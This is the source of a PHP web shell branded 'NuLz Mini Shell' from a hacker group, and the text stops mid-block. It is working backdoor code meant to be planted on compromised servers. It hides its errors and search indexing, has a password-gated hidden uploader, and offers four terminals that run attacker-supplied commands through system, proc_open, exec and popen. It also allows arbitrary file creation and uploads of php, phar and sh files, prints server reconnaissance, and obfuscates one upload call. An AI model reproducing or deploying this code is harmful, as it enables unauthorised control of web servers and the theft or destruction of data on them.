<?php
/*
Mau Recode Izin Dek! https://haxorstars.t.me
Anti enc enc club kaya lu nub
Kalo Recode Minimal Tambah Fitur Dek Jangan Numpang Nama Doang Nub!
Salam Heker Pro
-NuLz @haxorstars
*/

//head
session_start();
set_time_limit(0);
error_reporting(0);
@ini_set('error_log', null);
@ini_set('log_errors', 0);
@ini_set('max_execution_time', 0);
@ini_set('output_buffering', 0);
@ini_set('display_errors', 0);
date_default_timezone_set('Asia/Jakarta');

//config shell
$shellName = "NuLz Mini Shell";
$shellLogo = "https://nulz-archive.vercel.app/archive/nulz.png";
$shellIcon = "https://nulz-archive.vercel.app/archive/nulz.ico";
$shellFooter = '
<footer class="bg-transparent text-center lg:text-center">
<div class="p-4 font-bold text-center text-white dark:text-white">© 2022 Copyright:
  <a class="text-red-800 dark:text-red-400" href="https://github.com/haxorstars">NuLz Haxorstars</a>
</div>
</footer>';

//tailwind config text color
$txtBlack = "text-black";
$txtWhite = "text-white";
$txtOrange = "text-orange-500";
$txtRed = "text-red-600";
$txtRose = "text-rose-500";
$txtGreen = "text-green-600";
$txtEmerald = "text-emerald-500";
$txtSky = "text-sky-500";
$txtBlue = "text-blue-500";
$txtYellow = "text-yellow-400";
$txtPurple = "text-purple-600";

//tailwind config font size
$fsXs = "font-size: 1.55vh;";
$fsSm = "font-size: 1.75vh;";
$fsLg = "font-size: 2vh;";
$fsXl = "font-size: 2.55vh;";
$fsXxl = "font-size: 2.75vh;";
$fsBig = "font-size: 3vh;";
$fsBigs = "font-size: 3.55vh;";
$fsBigest = "font-size: 3.75vh;";
$fsSuper = "font-size: 4vh;";

//font family
$poppins = "font-family: 'Poppins', sans-serif;";
$ubuntuMono = "font-family: 'Ubuntu Mono', monospace;";
$tradeWinds = "font-family: Trade Winds;";
$sourceCodePro = "font-family: 'Source Code Pro', monospace;";
$josefinSans = "font-family: 'Josefin Sans', sans-serif;";


//tailwind config background color
$bgBlack = "bg-black";
$bgWhite = "bg-white";
$bgRed = "bg-red-500";
$bgGreen = "bg-green-600";
$bgBlue = "bg-blue-600";
$bgYellow = "bg-yellow-400";
$bgParent = "bg-transparent";
$bgSlate = "bg-slate-800";

//manual config color
$blackSemiParent1 = "rgba(0,0,0,0.1)";
$blackSemiParent2 = "rgba(0,0,0,0.2)";
$blackSemiParent3 = "rgba(0,0,0,0.3)";
$whiteSemiParent1 = "rgba(255,255,255,0.1)";
$whiteSemiParent2 = "rgba(255,255,255,0.2)";
$whiteSemiParent3 = "rgba(255,255,255,0.3)";

//icon config
$filesIcon = "https://raw.githubusercontent.com/haxorstars/archive/main/media/files.png";
$newFilesIcon = "https://raw.githubusercontent.com/haxorstars/archive/main/media/new-files.png";
$folderIcon = "https://raw.githubusercontent.com/haxorstars/archive/main/media/folder.png";
$newFolderIcon = "https://raw.githubusercontent.com/haxorstars/archive/main/media/new-folder.png";

//system information
$kernel = php_uname('a');
$os = PHP_OS;
$serverName = $_SERVER['SERVER_SOFTWARE'];
$userAgent = $_SERVER['HTTP_USER_AGENT'];
if (!function_exists('posix_getegid')) {
    $user = function_exists("get_current_user") ? @get_current_user() : "????";
    $uid = function_exists("getmyuid") ? @getmyuid() : "????";
    $gid = function_exists("getmygid") ? @getmygid() : "????";
    $group = "?";
} else {
    $uid = function_exists("posix_getpwuid") && function_exists("posix_geteuid") ? @posix_getpwuid(posix_geteuid()) : array("name" => "????", "uid" => "????");
    $gid = function_exists("posix_getgrgid") && function_exists("posix_getegid") ? @posix_getgrgid(posix_getegid()) : array("name" => "????", "gid" => "????");
    $user = $uid['name'];
    $uid = $uid['uid'];
    $group = $gid['name'];
    $gid = $gid['gid'];
}
$phpVersion = phpversion();
$phpServer = php_sapi_name();

if (@ini_get('safe_mode'))
    $safeMode = '<font class="ubuntu-mono ' . $txtGreen . '">OFF</font>';
else
    $safeMode = '<font class="ubuntu-mono ' . $txtYellow . '">OFF</font>';

if (@ini_get('disable_functions'))
    $cekFunc = '<font class="ubuntu-mono ' . $txtYellow . '">' . @ini_get('disable_functions') . '</font>';
else
    $cekFunc = '<font class="ubuntu-mono ' . $txtGreen . '">All Functions Accessible</font>';

$dirSep = DIRECTORY_SEPARATOR;
$suffix = PHP_SHLIB_SUFFIX;
$pathSep = PATH_SEPARATOR;

//login
$passwd = '386421265b975230158e1386249bc28c82ba8bd6';
if (isset($_POST['btn-login'])) {
    if (SHA1($_POST['pass']) == $passwd) {
        echo "<script>alert('Login Success! You Pro');</script>";
        $_SESSION["login"] = "login";
        setcookie('login', $passwd, time() + 60);
    } else {
        echo "<script>alert('Login Failed! You Nub');</script>";
    }
}
if (isset($_GET['logout'])) {
    $_SESSION = [];
    session_unset();
    session_destroy();
    setcookie('login', '', time() - 3600);
    echo "<script>window.location.assign('" . $_SERVER['PHP_SELF'] . "')</script>";
    exit();
}

if (empty($_SESSION['login'])) {
    if (empty($_COOKIE['login'])) {
        ?>
<!DOCTYPE html>
<html lang="en">

<head>
    <title>.:
        <?= $shellName ?> Login:.
    </title>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <meta http-equiv="X-UA-Compatible" content="ie=edge" />
    <meta name="description" content=".:<?= $shellName ?> Login:." />
    <meta name="robots" content="noindex, nofollow" />
    <meta name="googlebot" content="noindex, nofollow" />
    <meta name="bingbot" content="noindex, nofollow" />
    <script src="https://unpkg.com/typewriter-effect@2.18.2/dist/core.js"></script>
    <style>
    @import url("https://fonts.googleapis.com/css2?family=Noto+Sans+Mono&display=swap");

    * {
        margin: 0;
        padding: 0;
        box-sizing: border-box;
    }

    body {
        background-image: url('https://raw.githubusercontent.com/haxorstars/archive/main/media/scleton.gif'), linear-gradient(rgba(0, 0, 0, 0.5), rgba(255, 255, 255, 0.5));
        background-position: center;
        background-size: cover;
        background-repeat: no-repeat;
        background-attachment: fixed;
    }

    .terminal {
        position: absolute;
        left: 50%;
        top: 50%;
        transform: translate(-50%, -50%);
        font-family: "Noto Sans Mono", monospace;
        width: 400px;
        height: 250px;
        background: rgba(36, 38, 46, 1);
        border: 1px solid #eaeaea;
        animation: fadein 7s;
    }

    @keyframes fadein {
        from {
            filter: brightness(0%);
        }

        to {
            filter: brightness(100%);
        }
    }

    .terminal .root {
        position: absolute;
        padding: 5px;
        font-size: 10px;
        font-weight: 600;
        color: #f00;
    }

    .terminal #app {
        position: absolute;
        top: 11.9%;
        left: 9%;
        font-size: 10px;
        color: #00ff00;
        padding: 5px;
    }

    .terminal .passwd {
        position: absolute;
        top: 20%;
        left: 2%;
        font-family: monospace;
        font-size: 10px;
        color: #00ff00;
    }

    .terminal .passwd input[type=text] {
        background: transparent;
        border: none;
        outline: none;
        font-family: monospace;
        font-size: 10px;
        color: #00ff00;
    }

    .terminal .passwd input[type=text]:hover {
        border: none;
        outline: none;
    }

    .headerTerm {
        display: flex;
        flex-direction: row;
        align-items: center;
        width: 399px;
        height: 15px;
        background: #eaeaea;
    }

    .headerTerm img {
        width: 15px;
        height: 15px;
        padding-bottom: 3.5px;
        padding-left: 3px;
    }

    .headerTerm span {
        position: absolute;
        left: 4%;
        font-family: Monospace;
        font-size: 10px;
        font-weight: 500;
    }

    .headerTerm strong {
        position: absolute;
        left: 50%;
        transform: translate(-50%);
        font-family: Monospace;
        font-size: 10px;
        font-weight: 500;
    }

    @media screen and (min-width: 720px) {
        .terminal {
            width: 600px;
            height: 350px;
        }

        .terminal .root {
            font-size: 15px;
        }

        .terminal #app {
            font-size: 15px;
        }

        .terminal .passwd {
            font-size: 15px;
        }

        .terminal .passwd input[type=text] {
            font-size: 15px;
        }

        .headerTerm {
            width: 599px;
            height: 20px;
        }

        .headerTerm img {
            width: 20px;
            height: 20px;
            padding-top: 2px;
        }

        .headerTerm span {
            font-size: 13px;
        }

        .headerTerm strong {
            font-size: 13px;
        }
    }

    @media screen and (min-width: 900px) {
        .terminal {
            width: 800px;
            height: 450px;
        }

        .terminal .root {
            font-size: 20px;
        }

        .terminal #app {
            font-size: 20px;
        }

        .terminal .passwd {
            font-size: 20px;
        }

        .terminal .passwd input[type=text] {
            font-size: 20px;
        }

        .headerTerm {
            width: 799px;
            height: 25px;
        }

        .headerTerm img {
            width: 25px;
            height: 25px;
            padding-top: 2.5px;
        }

        .headerTerm span {
            font-size: 18px;
        }

        .headerTerm strong {
            font-size: 18px;
        }
    }

    @media screen and (max-width: 500px) {
        .terminal {
            width: 280px;
            height: 150px;
        }

        .terminal .root {
            font-size: 6.5px;
            padding: 2px;
        }

        .terminal #app {
            font-size: 6.5px;
            padding: 2px;
        }

        .terminal .passwd {
            position: absolute;
            top: 20%;
            left: 2%;
            font-family: monospace;
            font-size: 10px;
            color: #00ff00;
        }

        .terminal .passwd input[type=text] {
            background: transparent;
            border: none;
            outline: none;
            font-family: monospace;
            font-size: 10px;
            color: #00ff00;
        }

        .terminal .passwd input[type=text]:hover {
            border: none;
            outline: none;
        }

        .headerTerm {
            width: 279px;
            height: 8.5px;
        }

        .headerTerm img {
            width: 8.5px;
            height: 8.5px;
            padding: 1.5px;
            position: absolute;
        }

        .headerTerm span {
            font-size: 6px;
            left: 4%;
        }

        .headerTerm strong {
            font-size: 6px;
            right: 4%;
        }
    }
    </style>
</head>

<body>
    <div class="terminal">
        <div class="headerTerm">
            <img src="https://raw.githubusercontent.com/haxorstars/archive/main/media/terminal.png"
                alt="terminal" /><span>Terminal</span>
            <strong>
                <?= $shellName ?> Login
            </strong>
        </div>
        <div class="root" style="color: #d00c0c"></div>
        <h1 id="app"></h1>
        <div class="passwd">
            <form action="" method="post">
                <label for="pass">Password</label>
                <input type="text" id="pass" name="pass">
                <button type="submit" name="btn-login" style="display: none;"></button>
            </form>
        </div>
    </div>

    <script type="text/javascript">
    var root = document.querySelector(".root");
    var name = `
                                ╭──[root@nulzXomest]<br>
                                ╰──➤
                                `;
    root.innerHTML = name;

    var app = document.getElementById("app");
    var typewriter = new Typewriter(app, {
        loop: true,
        delay: 150,
    });
    /*NuLz Ganteng*/
    typewriter
        .pauseFor(500)
        .typeString("Welcome To Priv8 WebShell")
        .pauseFor(2000)
        .deleteChars(25)
        .typeString("Created By NuLz & Omest")
        .pauseFor(2000)
        .start();
    </script>
</body>

</html>
<?php
        exit();
    }
}
//HIDDEN SHELL
if (isset($_POST['buatfile'])) {
    $namafile = $_POST['namafile'];
    $isifile = $_POST['isifile'];
    $handle = fopen("$namafile", "w");
    if ($isifile) {
        $buatfile = fwrite($handle, $isifile);
    } else {
        $buatfile = $handle;
    }
    if ($buatfile) {
        echo "<script>alert('Berhasil Buat File :)');</script>";
    } else {
        echo "<script>alert('Gagal Buat File :(');</script>";
    }
}

if (isset($_GET['nulz'])) {
	if (isset($_GET['ganteng'])) {
        echo '
        <!DOCTYPE html>
        <html lang="en">
            <head>
            <title>.:NuLz404 Hidden Uploader:.</title>
                <meta charset="UTF-8">
                <meta name="viewport" content="width=device-width, initial-scale=1.0">
                <meta http-equiv="X-UA-Compatible" content="ie=edge">
                <meta name="description" content="This Is A Hidden Uploader">
                <meta name="author" content="NuLz404">
                <link rel="shortcut icon" href="'.$shellIcon.'" type="image/x-icon" />
                <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css" type="text/css" />
                <link href="https://fonts.googleapis.com/css?family=Trade+Winds" rel="stylesheet" type="text/css" />
                <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js"></script>
                <style>
                    body {
                        background: #000000;
                        display: flex;
                        flex-wrap: wrap;
                        justify-content: center;
                        align-items: center;
                        min-height: 100vh;
                    }
                    .root {
                        display: flex;
                        flex-wrap: wrap;
                        flex-direction: column;
                        justify-content: center;
                        align-items: center;
                        color: #eaeaea;
                        width: 100%;
                        height: auto;
                    }
                    .root h1 {
                        style="font-size: 3vh;
                        font-weight: 700;
                        font-family: Trade Winds;
                        text-shadow:0pt 0pt 10pt #fc0909,0pt 0pt 20pt #ffffff,0pt 0pt 30pt #fc0909;
                    }
                    .root form {
                        display: flex;
                        flex-direction: column;
                        flex-wrap: wrap;
                        justify-content: center;
                        align-items: center;
                    }
                    .root form button {
                        background: rgba(255,255,255,0.1);
                        color: #ffffff;
                        border: 1px solid #eaeaea;
                        border-radius: 10px;
                        font-size: 1.75vh;
                        font-weight: 700;
                        padding: 2.5px 5px 2.5px;
                        margin: 0;
                    }
                    .root form button:hover {
                        background: rgba(0,0,0,0.75);
                        box-shadow: 0 0 10pt rgba(255,0,0,0.50), 0 0 20pt rgba(255,0,0,0.75);
                    }
                </style>
            </head>
        <body>
            <div class="root">
                <div class="mb-4">
                    <a href="'.$_SERVER["PHP_SELF"].'"><button type="button" class="btn btn-outline-light">Home</button></a>
                    <a href="?nulz&ganteng&file"><button type="button" class="btn btn-outline-light">Buat File</button></a>
                    <a href="?nulz&ganteng&terminal"><button type="button" class="btn btn-outline-light">Terminal</button></a>
                </div>
                <h1>NuLz Hidden Mini Shell</h1>
                <form action="" method="post" enctype="multipart/form-data">
                <div class="mb-3" style="display: flex; justify-content: center; align-items: center;">
                    <label for="upl" style="color: #eaeaea; font-weight: 700; font-size: 1.75vh; margin: 1rem;">Upload File</label>
                    <input type="file" name="file[]" id="file" multiple>
                    <button type="submit" name="btn-upl" id="btn-upl">Upload</button>
                </div>';
                if (isset($_POST['btn-upl'])) {
                    $countfiles = count($_FILES['file']['name']);
                    for($i=0;$i<$countfiles;$i++){
                        $filename = $_FILES['file']['name'][$i];
                        $location = "".$filename;
                        $extension = pathinfo($location,PATHINFO_EXTENSION);
                        $extension = strtolower($extension);
                        $valid_extensions = array("jpg","jpeg","png","gif","pdf","docx","php","phtml","shtml","phar","html","cshtml","asp","aspx","jsp","txt","sh","python","perl","cgi","zip","tar","gz","img");

                        $response = 0;
                        if(in_array(strtolower($extension), $valid_extensions)) {
                            if(move_uploaded_file($_FILES['file']['tmp_name'][$i],$location)){
                                echo "<div class='mb-4' style='display: flex; justify-content: center; align-items: center; flex-direction: column;'>";
                                echo "<span style='color: #00ff36;'>Upload Success</span>";
                                echo "<span>file => <a href='".$filename."' color='#0092ff' target='_blank'>".$filename."</a></span><br/>";
                                echo "</div>";
                            }
                        } else {
                            echo "<div class='mb-4' style='display: flex; justify-content: center; align-items: center; flex-direction: column;'>";
                            echo "<span style='color: #ff0000;'>Upload Failed :(</span>";
                            echo "<span>file => ".$filename."<br/>";
                            echo "</div>";
                        }
                    }
                }
            ?>
            <?php
                if (isset($_GET['file'])) {
                    echo '
                    <div class="mb-3">
                        <label for="namafile" class="form-label">Buat File</label>
                        <input type="text" class="form-control form-control-sm" name="namafile" id="namafile" placeholder="nama file">
                        <textarea class="form-control form-control-sm mt-3" name="isifile" rows="8" placeholder="isi file" id="isifile"></textarea>
                        <div class="mt-3 d-grid gap-2">
                            <input class="btn btn-outline-light" type="submit" name="buatfile" value="Buat File">
                        </div>
                    </div>
                    ';
                }
                if (isset($_GET['terminal'])) {
                    echo '
                    <div class="mb-4">
                        <a href="?nulz&ganteng&terminal&term1"><button type="button" class="btn">Terminal 1</button></a>
                        <a href="?nulz&ganteng&terminal&term2"><button type="button" class="btn">Terminal 2</button></a>
                        <a href="?nulz&ganteng&terminal&term3"><button type="button" class="btn">Terminal 3</button></a>
                        <a href="?nulz&ganteng&terminal&term4"><button type="button" class="btn">Terminal 4</button></a>
                    </div>
                    ';
                    $inputCmd = '
                    <div class="mb-3">
                        <label for="terminal" class="form-label">Command</label>
                        <input type="text" class="form-control form-control-sm" name="cmd" id="cmd" placeholder="ls -la | dir">
                        <div class="mt-3 d-grid gap-2">
                            <button class="btn btn-outline-light" type="submit" name="enter">enter<?button>
                    </div></div>';
                    if (isset($_GET['term1'])) {
                    echo $inputCmd;
                    echo "<b>Terminal 1</b>";
                    echo '<textarea style="font-size: 1vh;" class="form-control form-control-lg mt-3" name="output" rows="20" readonly="true">';
						$shell = ["system", "passthru", "shell_exec"];
						$chose = array_rand($shell);
						if (isset($_POST["enter"])) {
							echo 'Use Function > ' . $shell[$chose] . PHP_EOL . '---------------------------------------' . PHP_EOL;
							echo $shell[$chose]($_POST["cmd"]);
						}
					echo '</textarea>';
                    }
                    if (isset($_GET['term2'])) {
                        echo $inputCmd;
                        echo "<b>Terminal 2</b>";
                        echo '<textarea style="font-size: 1vh;" class="form-control form-control-lg mt-3" name="output" rows="20" readonly="true">';
                        if (isset($_POST["enter"])) {
                            $exe_command = $_POST['cmd'];
                            
                            $descriptorspec = array(
                                0 => array("pipe", "r"),
                                1 => array("pipe", "w"),
                                2 => array("pipe", "w") 
                            );
                            
                            $process = proc_open($exe_command, $descriptorspec, $pipes);
                            echo 'Use Function > proc_open'. PHP_EOL . '---------------------------------------' . PHP_EOL;
                            if (is_resource($process))
                            {
                                while( ! feof($pipes[1]))
                                {
                                    $return_message = fgets($pipes[1], 1024);
                                    if (strlen($return_message) == 0) break;
                            
                                    echo $return_message;
                                    ob_flush();
                                    flush();
                                }
                            }
                        }
                        echo '</textarea>';
                    }
                    if (isset($_GET['term3'])) {
                        echo $inputCmd;
                        echo "<b>Terminal 3</b>";
                        echo '<textarea style="font-size: 1vh;" class="form-control form-control-lg mt-3" name="output" rows="20" readonly="true">';
                        if (isset($_POST["enter"])) {
                            echo 'Use Function > exec'. PHP_EOL . '---------------------------------------' . PHP_EOL;
                            exec($_POST["cmd"], $out);
                            print_r($out);
                        }
                        echo '</textarea>';
                    }
                    if (isset($_GET['term4'])) {
                        echo $inputCmd;
                        echo "<b>Terminal 4</b>";
                        echo '<textarea style="font-size: 1vh;" class="form-control form-control-lg mt-3" name="output" rows="20" readonly="true">';
                        if (isset($_POST["enter"])) {
                            echo 'Use Function > popen'. PHP_EOL . '---------------------------------------' . PHP_EOL;
                            $thisCMD = popen($_POST["cmd"], "r");
                            $read = fread($thisCMD, 2096);
                            print_r("$thisCMD: ".gettype($thisCMD)."\n$read \n");
                            pclose($thisCMD);
                        }
                        echo '</textarea>';
                    }
                }
            ?>
            <?php    
                '</form>
            </div>
        </body>
        </html>';
    }
}
?>
<!doctype html>
<html>

<head>
    <title>
        <?= $shellName.' '.$_SERVER['HTTP_HOST'] ?>
    </title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="robots" content="noindex, nofollow" />
    <meta name="googlebot" content="noindex, nofollow" />
    <meta name="bingbot" content="noindex, nofollow" />
    <meta name="description" content=".:<?= $shellName ?>:." />
    <!-- Font Api -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <!-- Poppins -->
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@500&display=swap" rel="stylesheet">
    <!-- Ubuntu Mono -->
    <link href="https://fonts.googleapis.com/css2?family=Ubuntu+Mono&display=swap" rel="stylesheet">
    <!-- Source Code Pro -->
    <link href="https://fonts.googleapis.com/css2?family=Source+Code+Pro:wght@500&display=swap" rel="stylesheet">
    <!-- Josefin Sans -->
    <link href="https://fonts.googleapis.com/css2?family=Josefin+Sans:wght@700&display=swap" rel="stylesheet">
    <!-- Trade Winds -->
    <link href="https://fonts.googleapis.com/css?family=Trade+Winds" rel="stylesheet">
    <!-- Javascript Library -->
    <script src='https://code.jquery.com/jquery-2.2.4.min.js'></script>
    <!-- Font Awesome -->
    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v6.4.2/css/all.css">
    <script src="https://use.fontawesome.com/releases/v6.4.2/js/all.js"></script>
    <!-- Css Framework -->
    <script src="https://cdn.tailwindcss.com"></script>
    <!-- Flowbite -->
    <link href="https://cdnjs.cloudflare.com/ajax/libs/flowbite/1.8.1/flowbite.min.css" rel="stylesheet" />
    <script src="https://cdnjs.cloudflare.com/ajax/libs/flowbite/1.8.1/flowbite.min.js"></script>
    <!-- Css Manual -->
    <style>
    body {
        background-color: #0c192c;
        filter: contrast(200%) brightness(150%);
        color: rgba(255, 255, 255, 1)
    }

    tr:hover {
        background: rgba(63, 109, 176, 0.50);
    }
    
    .poppins {
        <?=$poppins ?>
    }

    .ubuntu-mono {
        <?=$ubuntuMono ?>
    }

    .source-code-pro {
        <?=$sourceCodePro ?>
    }

    .josefin-sans {
        <?=$josefinSans?>
    }

    .trade-winds {
        <?=$tradeWinds ?>
    }

    .fs-xs {
        <?=$fsXs ?>
    }

    .fs-sm {
        <?=$fsSm ?>
    }

    .fs-lg {
        <?=$fsLg ?>
    }

    .fs-xl {
        <?=$fsXl ?>
    }

    .fs-xxl {
        <?=$fsXxl ?>
    }

    .fs-big {
        <?=$fsBig ?>
    }

    .fs-bigs {
        <?=$fsBigs ?>
    }

    .fs-bigest {
        <?=$fsBigest ?>
    }

    .fs-super {
        <?=$fsSuper ?>
    }
    /* Terminal Style */
    .terminal {
        position: absolute;
        left: 50%;
        top: 50%;
        transform: translate(-50%, -50%);
        font-family: "Noto Sans Mono", monospace;
        width: 400px;
        height: 250px;
        background: rgba(36, 38, 46, 1);
        border: 1px solid #eaeaea;
        animation: fadein 7s;
    }

    .terminal .root {
        position: absolute;
        padding: 5px;
        font-size: 10px;
        font-weight: 600;
        color: #f00;
    }

    .terminal form {
        width: auto;
        height: auto;
    }

    .terminal .command {
        position: absolute;
        left: 1%;
        font-family: monospace;
        font-size: 10px;
        color: #00ff00;
    }

    .terminal textarea {
        position: absolute;
        left: 1%;
        margin-top: 10px;
        padding: 0;
        width: 100%;
        height: 90px;
        font-family: monospace;
        font-size: 10px;
        color: #eaeaea;
        display: flex;
        flex-direction: row;
        flex-wrap: nowrap;
        overflow-x: hidden;
    }

    .terminal .command input[type=text] {
        background: transparent;
        border: none;
        outline: none;
        cursor: pointer;
        font-family: monospace;
        font-size: 10px;
        color: #00ff00;
    }
    .terminal .command input[type=text]:hover {
    	border: none;
    	outline: none;
    }

    .headerTerm {
        display: flex;
        flex-direction: row;
        align-items: center;
        width: 399px;
        height: 15px;
        background: #eaeaea;
    }

    .headerTerm img {
        width: 15px;
        height: 15px;
        padding-bottom: 3.5px;
        padding-left: 3px;
    }

    .headerTerm span {
        position: absolute;
        left: 4%;
        font-family: Monospace;
        font-size: 10px;
        font-weight: 500;
        color: #000;
    }

    .headerTerm strong {
        position: absolute;
        left: 50%;
        top: 50%;
        transform: translate(-50%, -50%);
        font-family: Monospace;
        font-size: 10px;
        font-weight: 500;
        color: #000;
    }

    @media screen and (min-width: 720px) {
        .terminal {
            width: 600px;
            height: 350px;
        }

        .terminal .root {
            font-size: 15px;
        }

        .terminal .command {
            font-size: 15px;
        }

        .terminal .command input[type=text] {
            font-size: 15px;
        }

        .headerTerm {
            width: 599px;
            height: 20px;
        }

        .headerTerm img {
            width: 20px;
            height: 20px;
            padding-top: 2px;
        }

        .headerTerm span {
            font-size: 13px;
        }

        .headerTerm strong {
            font-size: 13px;
        }
    }

    @media screen and (min-width: 900px) {
        .terminal {
            width: 800px;
            height: 450px;
        }

        .terminal .root {
            font-size: 20px;
        }

        .terminal .command {
            font-size: 20px;
        }

        .terminal .command input[type=text] {
            font-size: 20px;
        }

        .headerTerm {
            width: 799px;
            height: 25px;
        }

        .headerTerm img {
            width: 25px;
            height: 25px;
            padding-top: 2.5px;
        }

        .headerTerm span {
            font-size: 18px;
        }

        .headerTerm strong {
            font-size: 18px;
        }
    }

    @media screen and (max-width: 500px) {
        .terminal {
            width: 280px;
            height: 150px;
        }

        .terminal .root {
            font-size: 6.5px;
            padding: 2px;
        }

        .terminal .command {
            left:1%;
            font-size: 10px;
        }

        .terminal .command input[type=text] {
            font-size: 5px;
        }

        .headerTerm {
            width: 279px;
            height: 8.5px;
        }

        .headerTerm img {
            width: 8.5px;
            height: 8.5px;
            padding: 1.5px;
            position: absolute;
        }

        .headerTerm span {
            font-size: 6px;
            left: 4%;
        }

        .headerTerm strong {
            font-size: 6px;
            right: 4%;
        }
    }
    </style>
</head>

<body>
    <header class="w-full flex flex-row">
        <div class="shell whitespace-nowrap py-2 px-2 flex flex-col">
            <a href="?nulz&ganteng" class="flex flex-row flex-nowrap"><img class="rounded rounded-xl" style="width: 5vh; height: 5vh;" src="<?=$shellLogo?>" alt="LOGO"><h1 class="<?= $txtBlue ?> mx-2 fs-super trade-winds"><?= $shellName ?></h1></a>
            <span class="fs-xl poppins <?= $txtPurple ?>">Kernel: <font class="ubuntu-mono <?= $txtGreen ?>">
                    <?= $kernel ?>
                </font></span>
            <span class="fs-xl poppins <?= $txtPurple ?>">OS: <font class="ubuntu-mono <?= $txtGreen ?>"><?= $os ?>
                </font>
            </span>
            <span class="fs-xl poppins <?= $txtPurple ?>">SOFTWARE: <font class="ubuntu-mono <?= $txtGreen ?>">
                    <?= $serverName ?></font></span>

            <span class="fs-xl poppins <?= $txtPurple ?>">USER: <font class="ubuntu-mono <?= $txtGreen ?>">
                    <?= $uid . '[ ' . $user . ' ]' ?></font> GROUP: <font class="ubuntu-mono <?= $txtGreen ?>">
                    <?= $gid . '[ ' . $group . ' ]' ?>
                </font></span>
            <span class="fs-xl poppins <?= $txtPurple ?>">PHP VERSION: <font class="ubuntu-mono <?= $txtGreen ?>">
                    <?= $phpVersion ?></font> PHP SERVER: <font class="ubuntu-mono <?= $txtGreen ?>"><?= $phpServer ?>
                </font> SAFE MODE:
                <?= $safeMode ?>
            </span>
            <span class="fs-xl poppins <?= $txtPurple ?>">SERVER IP: <font class="ubuntu-mono <?= $txtGreen ?>">
                    <?= (!@$_SERVER["SERVER_ADDR"] ? (function_exists("gethostbyname") ? @gethostbyname($_SERVER['SERVER_NAME']) : '????') : @$_SERVER["SERVER_ADDR"]) ?>
                </font> YOUR IP:
                <font class="ubuntu-mono <?= $txtGreen ?>"><?= @$_SERVER["REMOTE_ADDR"] ?></font>
            </span>
            <span class="fs-xl poppins <?= $txtPurple ?>">DATE TIME: <font id="time" class="ubuntu-mono <?= $txtGreen ?>"></font></span>
                    <script>
                        setInterval(() => {
                            var jam = document.getElementById("time");
                            var bulanArr = ["January","February","Maret","April","Mei","Juni","July","Agustus","September","October","November","Desember"];
                            var waktu = new Date();
                            var tahun = waktu.getFullYear();
                            var bulan = bulanArr[waktu.getMonth()];
                            var tgl = waktu.getDate();
                            var hours = waktu.getHours();
                            var minutes = waktu.getMinutes();
                            var seconds = waktu.getSeconds();
                            jam.innerHTML  = tgl  + "-" + bulan + " " + tahun + " | " + hours + ":" + minutes + ":" + seconds; 
                        }, 1000);
                    </script>
            <span class="fs-xl poppins <?= $txtPurple ?>">DISABLE FUNCTIONS: <?= $cekFunc ?></span>
            <?php
            if (isset($_GET['path'])) {
                $path = $_GET['path'];
                chdir($_GET['path']);
            } else {
                $path = getcwd();
            }
            $path = str_replace("\\", "/", $path);
            $paths = explode("/", $path);
            echo '<span class="fs-xl poppins ' . $txtPurple . '">PWD: ';
            foreach ($paths as $id => $pat) {
                echo "<a class='" . $txtBlue . "' href='?path=";
                for ($i = 0; $i <= $id; $i++) {
                    echo $paths[$i];
                    if ($i != $id) {
                        echo '/';
                    }
                }
                echo "'>$pat</a><span class='" . $txtPurple . "'>/</span>";
            }
            echo "&nbsp;&nbsp;<a class='" . $txtPurple . "' href='" . $_SERVER['PHP_SELF'] . "'>[ <font class='" . $txtRed . "'>Home Shell</font> ]</a>";
            echo '</span>';
            ?>
        </div>
    </header>
    <?php
        if (isset($_POST['btn-upl'])) {
            $cou_ntfi_les = count($_FILES['file']['name']);
            for($i=0;$i<$cou_ntfi_les;$i++){
                $fi_le_name = $_FILES['file']['name'][$i];
                $loc_ation = "".$fi_le_name;
                $daolpu = "mo"."ve_up"."loa"."ded_fi"."le";
                if($daolpu($_FILES['file']['tmp_name'][$i],$loc_ation)){
                    echo '<script>
                    alert("Upload Success");
                    </script>';
                } else  {
                    echo '<script>
                    alert("Upload Failed!");
                    </script>';
                }
            }
        }
    ?>
    <form class="mx-2 flex flex-col border border-inherit px-2 py-4 rounded-lg w-max" action="" method="POST" enctype="multipart/form-data">
        <label class="block mx-2 fs-xl josefin-sans <?=$txtWhite?>" for="upl">Upload File</label>
        <div class="mx-2 flex flex-row flex-nowrap w">
        <div><input type="file" class="font-bold <?=$txtWhite?> border border-gray-300 rounded-lg cursor-pointer" name="file[]" id="file" multiple></div>
            <button type="submit" name="btn-upl" class="mx-2 font-bold bg-slate-800 hover:bg-slate-600 focus:outline-none focus:ring-4 focus:ring-gray-300 rounded-lg px-5 dark:bg-gray-800 dark:hover:bg-gray-700 dark:focus:ring-gray-700 dark:border-gray-700">Upload</button>
        </div>
        <div class="mx-2 mt-4">
            <a href="?option&path=<?= $path ?>/&newfolder"><button type="button" name="newfolder" class="inline-flex items-center px-2 py-2 mx-2 font-bold text-center <?=$txtWhite?> hover:text-black border rounded-lg focus:ring-4 focus:ring-amber-200 dark:focus:ring-amber-500 hover:bg-amber-500"><i class="fa-solid fa-folder-plus"></i>&nbsp;New Folder</button>
            <a href="?option&path=<?= $path ?>/&newfiles"><button type="button" name="newfiles" class="inline-flex items-center px-2 py-2 mx-2 font-bold text-center <?=$txtWhite?> hover:text-black border rounded-lg focus:ring-4 focus:ring-neutral-200 dark:focus:ring-neutral-400 hover:bg-neutral-400"><i class="fa-solid fa-file-circle-plus"></i>&nbsp;New Files</button>
            <a href="?option&path=<?= $path ?>/&command"><button type="button" name="command" class="inline-flex items-center px-2 py-2 mx-2 font-bold text-center <?=$txtWhite?> border rounded-lg focus:ring-4 focus:ring-slate-500 dark:focus:ring-slate-900 hover:bg-slate-900"><i class="fa-solid fa-terminal"></i>&nbsp;Terminal</button></a>
        </div>
    </form>
    <?php
    if (isset($_GET['newfolder'])) {
        if (isset($_POST['btn-newfolder'])) {
            $fo_lde_rna_me = $_POST['newfoldername'];
